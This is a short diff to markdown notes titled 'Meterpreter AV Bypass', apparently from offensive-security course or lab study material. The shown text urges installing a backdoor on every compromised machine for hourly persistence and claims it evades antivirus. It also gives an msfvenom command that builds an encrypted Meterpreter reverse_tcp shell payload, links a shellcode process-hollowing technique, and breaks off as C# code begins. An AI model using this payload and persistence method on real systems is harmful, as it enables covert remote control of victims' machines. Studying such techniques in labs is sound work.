@@ -1,5 +1,5 @@
 # Meterpreter AV Bypass
-This workflow works great for persistence when on a box. Everytime you root a machine, make sure you install the backdoor with this method.
+This workflow works great for persistence when on a target. Everytime you root a target, make sure you install the backdoor with this method. You will gain persistence every hour so you dont have to worry a shell dying. This method also bypass AVs in all the challenges, so you have a one stop shop.
 
 ## Payload
 ```
@@ -7,7 +7,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 --encrypt x
 ```
 
 ## Process Hollowing: (https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Shellcode%20Process%20Hollowing)
-Make sure you add the decoding routing to the byte that you generated. In this case it is x6A
+Make sure you add the decoding routine with the byte that you generated. In this case it is x6A
 ```
 ﻿using System;
 using System.Runtime.InteropServices;
